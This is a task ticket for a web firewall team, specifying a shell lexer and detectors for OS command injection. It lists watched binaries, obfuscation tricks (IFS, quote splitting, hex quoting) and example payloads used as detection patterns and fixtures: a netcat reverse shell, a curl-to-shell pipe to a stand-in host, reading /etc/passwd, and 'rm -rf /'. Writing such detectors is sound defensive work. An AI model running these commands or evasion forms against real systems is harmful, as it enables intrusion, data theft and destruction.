### T-0289 · Command injection: shell lexer and detectors
`P15` `[DP][SEC]` · deps: T-0242 · size: XL · owner: waf
**Objective.** Detect OS command injection structurally across shells.
**Steps.**
1. Implement a shell lexer (POSIX sh/bash and a Windows cmd/PowerShell mode) over the shell-canonical view producing words, operators (`;`, `&&`, `||`, `|`, `&`, newline), substitutions (`` `...` ``, `$(...)`, `${...}`), redirections, quotes, and PowerShell constructs (`;`, `|`, `iex`, `-enc`, `Invoke-Expression`, `Start-Process`).
2. Maintain a binary and builtin list (`cat`, `ls`, `id`, `whoami`, `uname`, `pwd`, `curl`, `wget`, `nc`, `ncat`, `bash`, `sh`, `zsh`, `python`, `perl`, `ruby`, `php`, `node`, `powershell`, `cmd`, `certutil`, `bitsadmin`, `nslookup`, `ping`, `sleep`, `echo`, `base64`, `chmod`, `chown`, `rm`, `mkdir`, `cp`, `mv`, `tar`, `zip`, `ssh`, `scp`, `ftp`, `tftp`, `telnet`, `ifconfig`, `ipconfig`, `netstat`, `ps`, `kill`, `env`, `set`, `type`, `dir`, `net user`, `reg`, `wmic`, `sc`, `schtasks`).
3. Hard detection when an operator or substitution is followed by a known binary (with optional arguments), or when a substitution contains a known binary (`$(whoami)`, `` `id` ``), or when a pipe chain includes shells (`| sh`, `| bash`), or when classic payloads appear (`; cat /etc/passwd`, `&& whoami`, `| nc host port -e /bin/sh`, `|| ping -c 10`); soft for isolated binaries in prose.
4. Handle obfuscation: `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, ANSI-C quoting `$'\x63\x61\x74'`, quote splitting `c''at`, backslash splitting `c\at`, wildcards `/???/c?t`, variable concatenation `a=c;b=at;$a$b`, base64 pipelines (`echo Y2F0|base64 -d|sh`), hex, `eval`.
5. Handle argument injection signals (T-0289 soft): option-like values (`--output=`, `-o /tmp`, `-exec`, `--upload-file`) after known binaries in fields expecting plain values.
6. Define subtypes (`metachar_binary`, `substitution`, `pipe_shell`, `reverse_shell`, `powershell`, `obfuscated`, `arg_injection`) and hardness rules; field-kind relaxations (search/free text: semicolon-binary pairs hard only if grammar-valid).
7. Fixtures for ATK-030 to ATK-033 (Class A harmless-looking commands such as `;id`, `|whoami`; Class B destructive shapes like `; rm -rf /`, only inert strings), counter-examples ("see you; id like to ask", tech articles listing commands in prose).
8. Benign gate, benchmark, fuzz.
**Deliverables.**
- shell lexer, detectors, rules, fixtures (≥ 250), tests
**Acceptance.**
- A1: `; cat /etc/passwd`, `$(whoami)`, `` `id` ``, `| nc ... -e /bin/sh`, `&& curl http://x.invalid | sh` are hard.
- A2: obfuscated forms (IFS, quote splitting, ANSI-C, brace expansion) are detected.
- A3: prose with semicolons and common words is not hard.
- A4: the lexer is bounded and panic-free (fuzz).
- A5: zero false positives on benign corpora.
**Tests.**
- Table (300) / proptest / fuzz.
**Notes.** ATK-030 to ATK-033 depend on the lexer.
